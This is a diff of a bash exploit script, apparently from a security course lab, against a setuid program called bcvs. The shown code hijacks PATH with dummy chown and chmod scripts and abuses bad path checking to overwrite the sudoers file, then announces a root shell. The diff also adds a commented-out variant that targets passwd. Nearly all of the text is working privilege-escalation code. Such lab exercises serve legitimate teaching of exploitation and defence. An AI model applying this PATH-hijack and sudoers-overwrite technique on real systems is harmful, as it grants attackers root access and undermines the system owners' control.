@@ -1,8 +1,7 @@
 #!/bin/bash
 
 ## ------------------------ Sploit Description ------------------------------ ##
-## This sploit generally exploits bad path checking in bcvs. See sploit3.txt
-## for more.
+## This sploit generally exploits bad path checking in bcvs. (Add more later)
 ##
 ## Note: After you run this you should reset the sudoers file by hand or
 ##      by using the reset script in ~/repo/scripts/reset_sudoers.sh . This
@@ -30,7 +29,6 @@ root ALL=(ALL:ALL) ALL
 END_OF_STR
 
 # Now setup dummy scripts to avoid the chmod and chown calls
-# Could just nuke the path as well
 PATH=.:$PATH
 cat <<EOS > "chown"
 #!/bin/bash
@@ -46,6 +44,7 @@ EOS
 chmod +x "./chown"
 chmod +x "./chmod"
 
+#echo "gotcha" | /opt/bcvs/bcvs co passwd
 echo "gotcha" | /opt/bcvs/bcvs co sudoers
 
 echo "Starting shell as root"
